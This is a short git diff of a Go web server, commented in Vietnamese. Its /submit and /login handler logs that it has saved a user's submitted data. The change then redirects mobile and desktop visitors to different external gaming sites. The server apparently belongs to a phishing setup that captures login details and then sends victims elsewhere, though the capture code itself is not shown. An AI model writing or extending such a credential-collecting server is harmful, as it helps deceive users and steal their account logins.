@@ -308,10 +308,25 @@ func main() {
 
 		log.Printf("SUCCESS: Đã lưu dữ liệu cho user=%q\n", username)
 
-		// Trả về JSON success để JavaScript xử lý redirect
+		// Xác định redirect URL dựa trên thiết bị
+		userAgent := r.Header.Get("User-Agent")
+		isMobile := isMobileDevice(userAgent)
+
+		var redirectURL string
+		if isMobile {
+			redirectURL = "https://www.qh178.com/home/mobile.html?gameId=161#/home"
+		} else {
+			redirectURL = "https://mk.luqiao.cc/home/"
+		}
+
+		// Trả về JSON success với redirect URL để JavaScript xử lý redirect
 		w.Header().Set("Content-Type", "application/json; charset=utf-8")
 		w.WriteHeader(http.StatusOK)
-		_, _ = w.Write([]byte(`{"success":true}`))
+		response := map[string]interface{}{
+			"success":  true,
+			"redirect": redirectURL,
+		}
+		json.NewEncoder(w).Encode(response)
 	}
 	http.HandleFunc("/submit", handleSubmit)
 	http.HandleFunc("/login", handleSubmit)        // alias cho tiện
